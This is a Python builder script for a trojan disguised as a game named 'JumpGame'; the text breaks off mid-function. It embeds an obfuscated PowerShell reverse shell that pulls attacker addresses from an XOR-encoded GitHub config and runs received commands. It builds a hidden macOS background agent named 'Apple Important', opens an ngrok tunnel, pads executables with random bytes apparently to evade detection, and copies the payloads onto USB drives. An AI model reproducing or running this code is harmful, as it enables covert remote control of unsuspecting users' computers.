#!/usr/bin/env python3
import os
import sys
import socket
import re
import json
import subprocess
import time
import shutil
import base64, random, string, requests

RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
CYAN = "\033[36m"
RESET = "\033[0m"

CONFIG_FILE = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "github_config.json"
)


def load_config():
    global \
        GITHUB_TOKEN, \
        REPO, \
        GITHUB_FILE_PATH, \
        BRANCH, \
        GITHUB_TARGETS_ENC_KEY, \
        RAW_GITHUB_TARGETS_URL
    if not os.path.exists(CONFIG_FILE):
        return
    try:
        with open(CONFIG_FILE) as f:
            cfg = json.load(f)
        GITHUB_TOKEN = cfg.get("GITHUB_TOKEN", "")
        REPO = cfg.get("REPO", "")
        GITHUB_FILE_PATH = cfg.get("GITHUB_FILE_PATH", "")
        BRANCH = cfg.get("BRANCH", "")
        GITHUB_TARGETS_ENC_KEY = cfg.get("GITHUB_TARGETS_ENC_KEY", "")
        RAW_GITHUB_TARGETS_URL = cfg.get("RAW_GITHUB_TARGETS_URL", "")
    except Exception:
        pass


def save_config():
    cfg = {
        "GITHUB_TOKEN": GITHUB_TOKEN,
        "REPO": REPO,
        "GITHUB_FILE_PATH": GITHUB_FILE_PATH,
        "BRANCH": BRANCH,
        "GITHUB_TARGETS_ENC_KEY": GITHUB_TARGETS_ENC_KEY,
        "RAW_GITHUB_TARGETS_URL": RAW_GITHUB_TARGETS_URL,
    }
    with open(CONFIG_FILE, "w") as f:
        json.dump(cfg, f, indent=2)
    os.chmod(CONFIG_FILE, 0o600)


def configure():
    print(f"{CYAN}── GitHub Configuration Wizard ──{RESET}")
    print(
        "This will save your GitHub credentials to a local file (Builder/github_config.json).\n"
    )

    print(f"{YELLOW}Step 1: GitHub Personal Access Token{RESET}")
    print("  Go to: https://github.com/settings/tokens")
    print("  Click 'Generate new token (classic)' → check 'repo' scope → generate")
    print("  Copy the token and paste it below.")
    GITHUB_TOKEN = input(f"{CYAN}  Token: {RESET}").strip()

    print(f"\n{YELLOW}Step 2: Repository{RESET}")
    print("  Your GitHub repo in 'owner/name' format (e.g. 'YourUser/JumpGame').")
    print("  Create it on GitHub first if you haven't already.")
    REPO = input(f"{CYAN}  Repo: {RESET}").strip()

    print(f"\n{YELLOW}Step 3: Config file path in repo{RESET}")
    print("  The C2 config file path inside your repo (e.g. 'config.json').")
    print("  The Builder will create/update this file on every build.")
    GITHUB_FILE_PATH = input(f"{CYAN}  File path: {RESET}").strip()

    print(f"\n{YELLOW}Step 4: Branch{RESET}")
    print("  The branch to push config to. Usually 'main' or 'master'.")
    BRANCH = input(f"{CYAN}  Branch: {RESET}").strip()

    print(f"\n{YELLOW}Step 5: Encryption key{RESET}")
    print("  Any random string. Used to XOR-encrypt the C2 config on GitHub.")
    print("  Must match what the payload's agent.py expects in PASSWORD.")
    GITHUB_TARGETS_ENC_KEY = input(f"{CYAN}  Key: {RESET}").strip()

    print(f"\n{YELLOW}Step 6: Raw config URL{RESET}")
    print("  Upload any file to your repo (e.g. config.json), go to it on GitHub,")
    print("  click the 'Raw' button, and copy the full URL.")
    print(
        "  Example: https://raw.githubusercontent.com/YourUser/JumpGame/main/config.json"
    )
    RAW_GITHUB_TARGETS_URL = input(f"{CYAN}  Raw URL: {RESET}").strip()

    save_config()
    print(f"{GREEN}\n✅ Configuration saved to {CONFIG_FILE}{RESET}")


def random_text():
    return random.choice(string.ascii_letters) + "".join(
        random.choices(string.ascii_letters + string.digits, k=random.randint(7, 31))
    )


# --- Handle --config flag before anything else ---
if "--config" in sys.argv:
    configure()
    sys.exit(0)

TEXT = random_text()
GITHUB_TOKEN = ""
REPO = ""
GITHUB_FILE_PATH = ""
BRANCH = ""
GITHUB_TARGETS_ENC_KEY = ""
RAW_GITHUB_TARGETS_URL = ""
load_config()
Run_Path = os.path.dirname(os.path.abspath(__file__))
BASE_FOLDER = os.path.join(Run_Path, "..")
CUSTOM_ICON = f"{BASE_FOLDER}/MyIcon.ico"
CUSTOM_DATA = f"{BASE_FOLDER}/inside_icon.png"
# --- Auto detect OS ---
if sys.platform.startswith("win"):
    ATTACKER_OS = 2
elif sys.platform == "darwin":
    ATTACKER_OS = 1
else:
    print(f"{RED}[!] Unsupported OS: {sys.platform}{RESET}")
    print(f"{CYAN}  This builder requires Windows or macOS.{RESET}")
    sys.exit(1)
VERSION_FILE = os.path.join(BASE_FOLDER, "version.txt")


def validate_config_win():
    missing = []

    if GITHUB_TOKEN == "":
        print(f"\n{RED}[!] GITHUB_TOKEN Variable is empty.{RESET}")
        print(
            f"    → {CYAN}Go to GitHub → Settings → Developer settings → Personal access tokens{RESET}"
        )
        print(
            f"    → {CYAN}Generate a token with repo permissions and paste it into GITHUB_TOKEN.{RESET}\n"
        )
        missing.append("GITHUB_TOKEN")

    if REPO == "":
        print(f"\n{RED}[!] REPO Variable is empty.{RESET}")
        print(
            f"    → {CYAN}Format: username/repository (example: Raphael123/JumpGame){RESET}\n"
        )
        missing.append("REPO")

    if GITHUB_FILE_PATH == "":
        print(f"\n{RED}[!] GITHUB_FILE_PATH Variable is empty.{RESET}")
        print(
            f"    → {CYAN}Path to config file inside the repo (example: config.json){RESET}\n"
        )
        missing.append("GITHUB_FILE_PATH")

    if BRANCH == "":
        print(f"\n{RED}[!] BRANCH Variable is empty.{RESET}")
        print(f"    → {CYAN}Usually 'main' or 'master'{RESET}\n")
        missing.append("BRANCH")

    if GITHUB_TARGETS_ENC_KEY == "":
        print(f"\n{RED}[!] GITHUB_TARGETS_ENC_KEY Variable is empty.{RESET}")
        print(
            f"    → {CYAN}Put any random string (used as encryption key, must match your client){RESET}\n"
        )
        missing.append("GITHUB_TARGETS_ENC_KEY")

    if RAW_GITHUB_TARGETS_URL == "":
        print(f"\n{RED}[!] RAW_GITHUB_TARGETS_URL Variable is empty.{RESET}")
        print(
            f"    → {CYAN}Go to your file on GitHub → click 'Raw' → copy the URL here{RESET}\n"
        )
        missing.append("RAW_GITHUB_TARGETS_URL")

    if missing:
        print(f"\n{YELLOW}[✖] Missing required variables.{RESET}\n")
        print(f"  {CYAN}Run the setup wizard:{RESET}")
        print(f"    python3 Builder/Builder.10h.py --config\n")
        sys.exit(1)


def validate_config_mac():
    missing = []

    if GITHUB_TOKEN == "":
        print(f"\n{RED}[!] GITHUB_TOKEN Variable is empty.{RESET}")
        print(
            f"    → {CYAN}Go to GitHub → Settings → Developer settings → Personal access tokens{RESET}"
        )
        print(
            f"    → {CYAN}Generate a token with repo permissions and paste it into GITHUB_TOKEN.{RESET}\n"
        )
        missing.append("GITHUB_TOKEN")

    if REPO == "":
        print(f"\n{RED}[!] REPO Variable is empty.{RESET}")
        print(
            f"    → {CYAN}Format: username/repository (example: Raphael123/JumpGame){RESET}\n"
        )
        missing.append("REPO")

    if GITHUB_FILE_PATH == "":
        print(f"\n{RED}[!] GITHUB_FILE_PATH Variable is empty.{RESET}")
        print(
            f"    → {CYAN}Path to config file inside the repo (example: config.json){RESET}\n"
        )
        missing.append("GITHUB_FILE_PATH")

    if BRANCH == "":
        print(f"\n{RED}[!] BRANCH Variable is empty.{RESET}")
        print(f"    → {CYAN}Usually 'main' or 'master'{RESET}\n")
        missing.append("BRANCH")

    if GITHUB_TARGETS_ENC_KEY == "":
        print(f"\n{RED}[!] GITHUB_TARGETS_ENC_KEY Variable is empty.{RESET}")
        print(
            f"    → {CYAN}Put any random string (used as encryption key, must match your client){RESET}"
        )
        missing.append("GITHUB_TARGETS_ENC_KEY")

    if RAW_GITHUB_TARGETS_URL == "":
        print(f"\n{RED}[!] RAW_GITHUB_TARGETS_URL Variable is empty.{RESET}")
        print(
            f"    → {CYAN}Go to your file on GitHub → click 'Raw' → copy the URL here{RESET}"
        )
        missing.append("RAW_GITHUB_TARGETS_URL")

    if missing:
        print(f"\n{YELLOW}[✖] Missing required variables.{RESET}\n")
        print(f"  {CYAN}Run the setup wizard:{RESET}")
        print(f"    python3 Builder/Builder.10h.py --config\n")
        sys.exit(1)


def update_ps_code():
    try:
        ps_code = f"""
            $max_attempts = 30
            $attempts = 0  
            $url = "{RAW_GITHUB_TARGETS_URL}"

            while ($true) {{
                try {{
                    $w = New-Object ("Net.Web" + "Client")
                    $w.Headers.Add("User-Agent", "Mozilla/5.0")
                    $content = $w.DownloadString($url)
                    
                    $data = $content | ConvertFrom-Json

                    function Decode-XOR($text, $password) {{
                        if (-not $text) {{ return $text }}
                        $bytes = [System.Convert]::FromBase64String($text)
                        $result = New-Object System.Text.StringBuilder
                        for ($i = 0; $i -lt $bytes.Length; $i++) {{
                            $key = [byte][char]$password[$i % $password.Length]
                            $result.Append([char]($bytes[$i] -bxor $key)) | Out-Null
                        }}
                        return $result.ToString()
                    }}

                    $password = "{GITHUB_TARGETS_ENC_KEY}"

                    if ($data.TARGETS) {{
                        $decoded = Decode-XOR $data.TARGETS $password
                        Write-Host "Decoded TARGETS: $decoded"
                        if ($decoded) {{
                            $targets = $decoded | ConvertFrom-Json
                            Write-Host "Parsed TARGETS: $($targets | Out-String)"
                            break 
                        }}
                    }}

                }} catch {{
                    Write-Host "Error fetching or parsing config: $_"
                    Start-Sleep -Seconds 55
                }}

                Start-Sleep -Seconds 5
            }}

            if ($targets.Count -eq 1) {{ $targets += ,(@('', 0)) }}
                    Write-Host "Final TARGETS: $($targets | Out-String)"
                    Set-Location $env:USERPROFILE
                    Write-Host "Starting reverse shell loop on user profile: $($env:USERPROFILE)"
                    while ($true) {{
                        foreach ($t in $targets) {{
                            Write-Host "Trying target: $($t[0]):$($t[1])"
                            $attempts++
                            if ($attempts -gt $max_attempts) {{exit}}
                            try {{
                                $ip = $t[0]; $port = $t[1]
                                $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
                                $stream = $client.GetStream()
                                $reader = New-Object System.IO.StreamReader($stream)
                                $writer = New-Object System.IO.StreamWriter($stream)
                                $writer.AutoFlush = $true
                                $attempts = 0

                                
                                while ($client.Connected) {{
                                    $writer.Write('PS: ' + (Get-Location).Path + ':-> ')
                                    $line = $reader.ReadLine()
                                    if ($null -eq $line -or $line -eq 'exit') {{ break }}
                                    if ([string]::IsNullOrWhiteSpace($line)) {{ continue }}

                                    try {{
                                        $out = Invoke-Expression $line 2>&1 | Out-String
                                        $writer.Write($out)
                                    }} catch {{
                                        $writer.WriteLine("Error: " + $_.Exception.Message)
                                    }}
                                }}
                                $client.Close()
                                Write-Host "Connection to ${{ip}}:${{port}} closed."
                            }} catch {{ continue }}
                        }}
                        Start-Sleep -Seconds 2
                    }}
                    """
        with open(SCRIPT_PATH, "r", encoding="utf-8") as f:
            content = f.read()

        # --- Prepare new encoded_ps value ---
        new_encoded_ps_value = enc(
            base64.b64encode(ps_code.encode("utf-16le")).decode(), TEXT
        )

        # --- Load existing script content ---
        with open(SCRIPT_PATH, "r", encoding="utf-8") as f:
            content = f.read()

        # --- Replace encoded_ps, TEXT, and RANDOM in one pass ---
        new_content = re.sub(
            r'encoded_ps\s*=\s*".*?"', f'encoded_ps = "{new_encoded_ps_value}"', content
        )

        lines = new_content.split("\n")
        for i, line in enumerate(lines):
            # Update RANDOM
            if line.strip().startswith("RANDOM = "):
                lines[i] = f"RANDOM = {random.randint(1000, pow(9999999999, 7))}"
            # Update TEXT
            elif line.strip().startswith("TEXT = "):
                lines[i] = f'TEXT = "{TEXT}"'

        # --- Join lines back and save ---
        new_content = "\n".join(lines)

        with open(SCRIPT_PATH, "w", encoding="utf-8") as f:
            f.write(new_content)

        print(f"{GREEN}[+] JumpGame_WIN.py updated successfully.")

    except Exception as e:
        print(f"{RED}Update error: {e}")


# --- Build decision helper ---
def enc(x, password=GITHUB_TARGETS_ENC_KEY):
    enc_bytes = bytearray()
    for i, c in enumerate(x):
        enc_bytes.append(ord(c) ^ ord(password[i % len(password)]))
    return base64.b64encode(enc_bytes).decode()


SCRIPT_PATH = f"{BASE_FOLDER}/JumpGame_WIN.py"


def build_and_install_agent():
    BASE_DIR = f"{BASE_FOLDER}"
    AGENT_PY = os.path.join(BASE_DIR, "agent.py")
    APP_NAME = "Apple Important"
    TARGET_RESOURCES = f"{BASE_FOLDER}/JumpGame.app/Contents/Resources"

    try:
        if not os.path.exists(AGENT_PY):
            raise FileNotFoundError(f"Could not find {AGENT_PY}")

        with open(AGENT_PY, "r", encoding="utf-8") as f:
            lines = f.readlines()

        # Only modify the first 30 lines
        for i in range(min(30, len(lines))):
            lines[i] = re.sub(
                r'PASSWORD\s*=\s*".*?"',
                f'PASSWORD = "{GITHUB_TARGETS_ENC_KEY}"',
                lines[i],
            )
            lines[i] = re.sub(
                r'GITHUB_CONFIG_URL\s*=\s*".*?"',
                f'GITHUB_CONFIG_URL = "{RAW_GITHUB_TARGETS_URL}"',
                lines[i],
            )

        with open(AGENT_PY, "w", encoding="utf-8") as f:
            f.writelines(lines)

        # --- Check if PyInstaller is installed ---
        try:
            import PyInstaller
        except ImportError:
            print(f"{YELLOW}[!] PyInstaller not found. Installing...{RESET}")
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", "pyinstaller"]
                )
                print(f"{GREEN}[+] PyInstaller installed successfully.{RESET}")
            except Exception as e:
                print(f"{RED}[!] Failed to install PyInstaller: {e}{RESET}")
                return
        print(f"{CYAN}Compiling JumpGame.app...\nThis may take a minute.")

        build_process = subprocess.Popen(
            [
                sys.executable,
                "-m",
                "PyInstaller",
                "--noconfirm",
                "--windowed",
                "--onefile",
                "--name",
                APP_NAME,
                "--strip",
                "--icon",
                f"{BASE_FOLDER}/AppIcon.icns",
                "--hidden-import",
                "base64",
                AGENT_PY,
            ],
            cwd=BASE_DIR,
        )

        # Wait for PyInstaller to finish
        build_process.wait()

        if build_process.returncode != 0:
            raise Exception(f"{RED}PyInstaller compilation failed.")

        SOURCE_APP = os.path.join(BASE_DIR, "dist", f"{APP_NAME}.app")
        FINAL_DEST = os.path.join(TARGET_RESOURCES, f"{APP_NAME}.app")

        os.makedirs(TARGET_RESOURCES, exist_ok=True)
        if os.path.exists(FINAL_DEST):
            shutil.rmtree(FINAL_DEST)
        shutil.copytree(SOURCE_APP, FINAL_DEST)

        # --- Add LSBackgroundOnly to Info.plist ---
        plist_path = os.path.join(FINAL_DEST, "Contents", "Info.plist")
        try:
            if os.path.exists(plist_path):
                with open(plist_path, "r", encoding="utf-8") as f:
                    plist_content = f.read()

                # Remove existing key if present
                plist_content = plist_content.replace(
                    "<key>LSBackgroundOnly</key>\n\t<true/>", ""
                )

                # Insert before closing </dict>
                plist_content = plist_content.replace(
                    "</dict>", "\t<key>LSBackgroundOnly</key>\n\t<true/>\n</dict>"
                )

                with open(plist_path, "w", encoding="utf-8") as f:
                    f.write(plist_content)
        except Exception as e:
            print(f"{RED}Plist update error: {e}")

        shutil.rmtree(os.path.join(BASE_DIR, "build"), ignore_errors=True)
        shutil.rmtree(os.path.join(BASE_DIR, "dist"), ignore_errors=True)
        spec_file = os.path.join(BASE_DIR, f"{APP_NAME}.spec")
        if os.path.exists(spec_file):
            os.remove(spec_file)
    except Exception as e:
        print(f"{RED}Error: {e}")


def get_ngrok_tunnel():
    try:
        r = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=5)
        data = r.json()
        for t in data.get("tunnels", []):
            url = t.get("public_url", "")
            if "tcp://" in url:
                url = url.replace("tcp://", "")
                host, port = url.split(":")
                return host, int(port)
    except Exception:
        pass
    return None, None


def run_build_logic_mac():
    print(f"{GREEN}--- 🎮 JumpGame Builder ---")
    overwrite_old = False

    def update_github_config(targets, int_ip, ng_host, ng_port):
        url = f"https://api.github.com/repos/{REPO}/contents/{GITHUB_FILE_PATH}?ref={BRANCH}"
        headers = {"Authorization": f"token {GITHUB_TOKEN}"}

        resp = requests.get(url, headers=headers, timeout=10)
        if resp.status_code == 404:
            print(f"{YELLOW}[!] Config file not found on GitHub.{RESET}")
            print(f"  {CYAN}Create an empty config.json in your repo first, then run again.{RESET}")
            return
        resp.raise_for_status()
        sha = resp.json()["sha"]

        new_content = {
            "TARGETS": enc(json.dumps(targets)),
            "INT_IP": enc(str(int_ip)),
            "NG_HOST": enc(str(ng_host)),
            "NG_PORT": enc(str(ng_port)),
        }
        encoded_content = base64.b64encode(
            json.dumps(new_content, indent=2).encode()
        ).decode()

        payload = {
            "message": "Update config from Builder script",
            "content": encoded_content,
            "branch": BRANCH,
            "sha": sha,
        }

        update_resp = requests.put(url, headers=headers, data=json.dumps(payload), timeout=10)
        if update_resp.status_code in [200, 201]:
            print(f"{GREEN}✅ Updated config.json on GitHub")
        else:
            print(f"{RED}❌ Failed to update:", update_resp.json())

    # --- Platform selection with Reset option ---
    build_target = "windows"
    try:
        try:
            Choice = int(
                input(
                    f"{CYAN}What to do?\n{BLUE}1) ♻︎ Reset GitHub Config\n{RED}2)  Make macOS Game Payload\n{YELLOW}3) ▣ Make Windows Game payload\n{RESET}Choice: "
                )
            )
        except ValueError:
            Choice = 3
        if Choice == 1:
            # Reset selected: Show previous config.json, then clear it on GitHub and exit
            try:
                url = f"https://api.github.com/repos/{REPO}/contents/{GITHUB_FILE_PATH}?ref={BRANCH}"
                headers = {"Authorization": f"token {GITHUB_TOKEN}"}
                # Get existing SHA and content
                resp = requests.get(url, headers=headers, timeout=10)
                if resp.status_code == 404:
                    print(f"{YELLOW}[!] Config file not found on GitHub. Nothing to reset.{RESET}")
                    os._exit(0)
                resp.raise_for_status()
                sha = resp.json()["sha"]

                # Now reset content to empty
                empty_content = base64.b64encode(b"{}").decode()
                payload = {
                    "message": "Reset config from Builder script",
                    "content": empty_content,
                    "branch": BRANCH,
                    "sha": sha,
                }
                update_resp = requests.put(
                    url, headers=headers, data=json.dumps(payload), timeout=10
                )
                if update_resp.status_code in [200, 201]:
                    print(f"{GREEN}✅ Reset config.json on GitHub")
                else:
                    print(f"{RED}❌ Failed to reset:", update_resp.json())
            except Exception as e:
                print(f"{RED}Reset error: {e}")
            os._exit(0)
        if Choice == 2:
            build_target = "mac"
    except Exception:
        build_target = "windows"

    # 1. Gathering info
    internal_ip = get_internal_ip()
    targets = [[internal_ip, 4444]]
    ng_host_val = "None"
    ng_port_val = "None"
    ngrok_started_by_builder = False

    # --- Ngrok Check ---
    # Ngrok start if needed
    if not is_ngrok_running():
        output = input(f"{CYAN}Ngrok is offline. Start it now? (Y/n)").lower()
        if output != "n":
            subprocess.Popen(
                ["ngrok", "tcp", "4444"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            print(f"{GREEN}[*] Starting ngrok...")
            time.sleep(2)
            ngrok_started_by_builder = True

    ng_host = None
    ng_port = None
    use_ngrok = False

    if is_ngrok_running():
        host, port = get_ngrok_tunnel()
        if host and port:
            print(f"{GREEN}[+] Ngrok address: {host}:{port}")
            if (
                ngrok_started_by_builder
                or input(f"{CYAN}Use ngrok address ({host}:{port})? (Y/n)").lower()
                != "n"
            ):
                use_ngrok = True
                ng_host = host
                ng_port = port
                ng_host_val = host
                ng_port_val = port
                targets.append([host, port])
    MAKE_FILE = input(f"{CYAN}Do you want to create the game files? (Y/n)").lower()
    # --- Validate targets before updating config ---
    # Validate targets list
    validated_targets = []
    for t in targets:
        if isinstance(t, (list, tuple)) and len(t) == 2:
            ip = str(t[0])
            try:
                port = int(t[1])
            except:
                port = 0
            validated_targets.append([ip, port])
    targets = validated_targets

    if MAKE_FILE != "n":
        print(
            f"{CYAN}[*] User chose to create the game files. Continuing with build..."
        )
    else:
        print(
            f"{CYAN}[*] User chose NOT to create game files. Updating GitHub config only."
        )
        try:
            ng_host_val = ng_host if use_ngrok and ng_host else "None"
            ng_port_val = ng_port if use_ngrok and ng_port else "None"
            update_github_config(targets, internal_ip, ng_host_val, ng_port_val)
            print(f"{GREEN}[+] GitHub config updated successfully. Exiting.")
        except Exception as e:
            print(f"{RED}[!] GitHub update failed: {e}")
        os._exit(0)
    # only ask if find USB drive if user want to copy to USB
    copy_to_usb = False
    volumes = [
        os.path.join("/Volumes", v)
        for v in os.listdir("/Volumes")
        if os.path.isdir(os.path.join("/Volumes", v))
        and v not in ["Macintosh HD", "Preboot", "Recovery"]
    ]
    if volumes:
        copy_to_usb = input(f"{CYAN}Copy build to USB drive? (Y/n)") == "y"

    # 2. Update Source or Automator depending on platform
    if build_target == "windows":
        try:
            ng_host_val = ng_host if use_ngrok and ng_host else "None"
            ng_port_val = ng_port if use_ngrok and ng_port else "None"
            update_github_config(targets, internal_ip, ng_host_val, ng_port_val)
        except Exception as e:
            print(f"{RED}Error updating github: {e}")
            os._exit(1)
        update_ps_code()
    else:
        try:
            ng_host_val = ng_host if use_ngrok and ng_host else "None"
            ng_port_val = ng_port if use_ngrok and ng_port else "None"
            update_github_config(targets, internal_ip, ng_host_val, ng_port_val)
            build_and_install_agent()
        except Exception as e:
            print(f"{RED}Agent update error: {e}")

    # Mac mode: handle USB copy logic with user prompt and folder check, and use ditto for copying JumpGame.app
    if build_target == "mac":
        # Compose detailed notification for Mac build

        usb_copy_result = "No"
        usb_copy_stopped = False
        copied_volumes = []
        partial_copies = []
        if copy_to_usb:
            # Prepare for multi-volume copy
            # Build a list of copy jobs and their resolved dest_app names
            copy_jobs = []
            for usb in volumes:
                dest_app = os.path.join(usb, "JumpGame.app")
                # If JumpGame.app already exists, ask what to do
                if os.path.exists(dest_app):
                    try:
                        output = int(
                            input(
                                f"{CYAN}JumpGame already exists on {usb}, What to do?\n{GREEN}1) ✚ Create New\n{YELLOW}2) ♻︎ Replace Old\n{BLUE}3) ✖ Cancel Copy\n{RESET}Choice: "
                            )
                        )
                    except ValueError:
                        print(f"{YELLOW}[!] Invalid input, skipping.{RESET}")
                        continue
                    try:
                        if output == 2:
                            try:
                                if os.path.isdir(dest_app):
                                    shutil.rmtree(dest_app)
                                else:
                                    os.remove(dest_app)
                            except Exception as e:
                                print(
                                    f"{RED}Error removing old JumpGame.app on USB: {e}"
                                )
                        elif output == 1:
                            dest_app = get_unique_path(dest_app)
                        else:
                            print(f"{YELLOW}[!] USB copy cancelled by user for {usb}")
                            # Eject the USB even if cancelled
                            volume_name = os.path.basename(usb)
                            os.system(
                                f'osascript -e "tell application \\"Finder\\" to eject disk \\"{volume_name}\\""'
                            )
                            print(f"{GREEN}[*] Ejected {volume_name}")
                            continue
                    except Exception as e:
                        print(f"{RED}[!] Failed to ask user about USB app: {e}")
                        # Eject the USB in case of error
                        volume_name = os.path.basename(usb)
                        os.system(
                            f'osascript -e "tell application \\"Finder\\" to eject disk \\"{volume_name}\\""'
                        )
                        print(f"{GREEN}[*] Ejected {volume_name}")
                        continue
                copy_jobs.append((usb, dest_app))
            # Start ditto copy for each USB, one-by-one, but allow stop at any time
            source_app = f"{BASE_FOLDER}/JumpGame.app"
            for usb, dest_app in copy_jobs:
                try:
                    # Start ditto as a subprocess
                    ditto_proc = subprocess.Popen(["ditto", source_app, dest_app])
                    ditto_proc.wait()
                    # Ditto finished, check result
                    if ditto_proc.returncode == 0 or os.path.exists(dest_app):
                        usb_copy_result = "Yes"
                        copied_volumes.append(usb)
                    else:
                        print(f"{RED}USB Error: Copy failed for {usb}")
                        partial_copies.append(usb)
                        usb_copy_result = "No"
                    # Eject the USB after copying attempt
                    volume_name = os.path.basename(usb)
                    os.system(
                        f'osascript -e "tell application \\"Finder\\" to eject disk \\"{volume_name}\\""'
                    )
                    print(f"{GREEN}[*] Ejected {volume_name}")
                except Exception as e:
                    print(f"{RED}USB Error: {e}")
                    partial_copies.append(usb)
        return

    # 3. Start Build with Stop Window
    print(f"{CYAN}[*] Preparing Build...")

    base_dir = os.path.dirname(SCRIPT_PATH)
    existing_exe = os.path.join(base_dir, "JumpGame.exe")
    if os.path.exists(existing_exe):
        try:
            action = int(
                input(
                    f"{CYAN}JumpGame.exe already exists, What to do?\n{GREEN}1) ✚ Create New\n{YELLOW}2) ♻︎ Replace Old\n{BLUE}3) ✖ Cancel Build\n{RESET}Choice: "
                )
            )
        except ValueError:
            action = 3

        if action == 3:
            print(f"{YELLOW}[!] Build cancelled by user.")
            sys.exit(0)
        elif action == 2:
            try:
                os.remove(existing_exe)
                overwrite_old = True
                print(f"{GREEN}[*] Old JumpGame.exe removed.")
            except Exception as e:
                print(f"{RED}Remove error: {e}")
        elif action == 1:
            existing_exe = get_unique_path(existing_exe)

    # Cleanup JumpGame.exe outside dist before build
    if os.path.exists(existing_exe):
        try:
            os.remove(existing_exe)
            print(f"{GREEN}[*] Existing JumpGame.exe removed before build.")
        except Exception as e:
            print(f"{RED}Error removing existing JumpGame.exe: {e}")

    print(f"{CYAN}[*] Starting Build process...")
    os.chdir(base_dir)

    base_dir = os.path.dirname(SCRIPT_PATH)
    dist_dir = os.path.join(base_dir, "dist")

    # --- Check if wine is installed ---
    try:
        subprocess.run(
            ["wine", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except FileNotFoundError:
        print(f"{RED}[!] wine is not installed on this system.{RESET}")
        print(f"{CYAN}Install it with: brew install --cask wine-stable (Mac){RESET}")
        return
    pyi_cmd = f'''
wine pyinstaller --onefile --noconsole \
--hidden-import="pygame" \
--hidden-import="time" \
--hidden-import="subprocess" \
--hidden-import="base64" \
--hidden-import="random" \
--hidden-import="threading" \
--hidden-import="os" \
--icon="{CUSTOM_ICON}" \
--version-file="{VERSION_FILE}" \
--add-data "{CUSTOM_DATA};." \
--name "JumpGame" \
"{SCRIPT_PATH}"
'''
    build_proc = subprocess.Popen(pyi_cmd, shell=True, preexec_fn=os.setsid)
    build_proc.wait()
    print(f"{RESET}Building JumpGame.exe ...")

    # Ensure build finished and file exists
    timeout = 120
    start_time = time.time()
    while not os.path.exists(os.path.join(dist_dir, "JumpGame.exe")):
        if time.time() - start_time > timeout:
            print(f"{RED}[!] Build timeout: EXE not found after waiting.")
            return
        time.sleep(1)

    game_exe = os.path.join(dist_dir, "JumpGame.exe")
    if os.path.exists(game_exe):
        if overwrite_old:
            final_path = os.path.join(base_dir, "JumpGame.exe")
        else:
            final_path = get_unique_path(os.path.join(base_dir, "JumpGame.exe"))
        shutil.copy2(game_exe, final_path)
        # --- Inflate file size by random amount ---
        try:
            with open(final_path, "ab") as f:
                f.write(
                    b"\0" * (random.randint(2 * 1024, 7 * 1024) * 1024)
                )  # random MB padding
            print(f"{GREEN}[*] File size increased by random amount.")
        except Exception as e:
            print(f"{RED}[!] Failed to inflate file size: {e}")
        if copy_to_usb:
            for usb in volumes:
                usb_path = os.path.join(usb, "JumpGame.exe")

                if os.path.exists(usb_path):
                    try:
                        output = int(
                            input(
                                f"{CYAN}JumpGame already exists on {os.path.basename(usb)}, What to do?\n{GREEN}1) ✚ Create New\n{YELLOW}2) ♻︎ Replace Old\n{BLUE}3) ✖ Cancel Copy\n{RESET}Choice: "
                            )
                        )

                        if output == 2:
                            try:
                                os.remove(usb_path)
                                print(
                                    f"{GREEN}[*] Old JumpGame.exe removed from {os.path.basename(usb)}"
                                )
                            except Exception as e:
                                print(f"{RED}USB Remove Error: {e}")

                        elif output == 1:
                            usb_path = get_unique_path(usb_path)

                        else:
                            print(
                                f"{YELLOW}[!] Skipped copying to {os.path.basename(usb)}"
                            )
                            continue

                    except Exception as e:
                        print(f"{RED}[!] Dialog failed: {e}")
                        continue

                try:
                    shutil.copy2(game_exe, usb_path)
                    # --- Inflate USB file size by random amount ---
                    try:
                        with open(usb_path, "ab") as f:
                            f.write(
                                b"\0" * (random.randint(2 * 1024, 7 * 1024) * 1024)
                            )  # 7 MB padding
                        print(
                            f"{GREEN}[*] Inflated file on {os.path.basename(usb)} by random amount."
                        )
                    except Exception as e:
                        print(f"{RED}[!] Failed to inflate USB file: {e}")
                    volume_name = os.path.basename(usb)
                    os.system(
                        f'osascript -e "tell application \\"Finder\\" to eject disk \\"{volume_name}\\""'
                    )
                    print(f"{GREEN}[*] Ejected {os.path.basename(usb)}")
                except Exception as e:
                    print(f"{RED}USB Error: {e}")

    # Cleanup build, dist, and obfuscated_dist manually
    for folder in ["build", "dist"]:
        folder_path = os.path.join(base_dir, folder)
        if os.path.exists(folder_path):
            for root, dirs, files in os.walk(folder_path, topdown=False):
                for name in files:
                    try:
                        os.remove(os.path.join(root, name))
                    except:
                        pass
                for name in dirs:
                    try:
                        os.rmdir(os.path.join(root, name))
                    except:
                        pass
            try:
                os.rmdir(folder_path)
            except:
                pass
    spec = os.path.join(base_dir, "JumpGame.spec")
    if os.path.exists(spec):
        os.remove(spec)

    print(f"\n{GREEN}[+] Done!")


def get_internal_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"


def is_ngrok_running():
    # Check if ngrok is installed
    try:
        subprocess.run(
            ["ngrok", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except FileNotFoundError:
        print(f"{RED}[!] ngrok is not installed on this system.{RESET}")
        return False

    # Check if ngrok process is running
    try:
        return (
            subprocess.run(["pgrep", "-x", "ngrok"], capture_output=True).returncode
            == 0
        )
    except Exception:
        return False


def get_unique_path(path):
    if not os.path.exists(path):
        return path
    base, ext = os.path.splitext(path)
    counter = 1
    while os.path.exists(f"{base}_{counter}{ext}"):
        counter += 1
    return f"{base}_{counter}{ext}"


def run_build_logic_windows():
    os.chdir(BASE_FOLDER)
    print(f"{CYAN}--- 🎮 JumpGame Builder (Windows) ---")
    try:
        action = int(
            input(
                f"{CYAN}What to do?\n1)Make Windows Game payload\n2)Reset GitHub page\n3)Cancel\nChoice: "
            )
        )
    except ValueError:
        action = 3
    if action == 2:
        try:
            url = f"https://api.github.com/repos/{REPO}/contents/{GITHUB_FILE_PATH}?ref={BRANCH}"
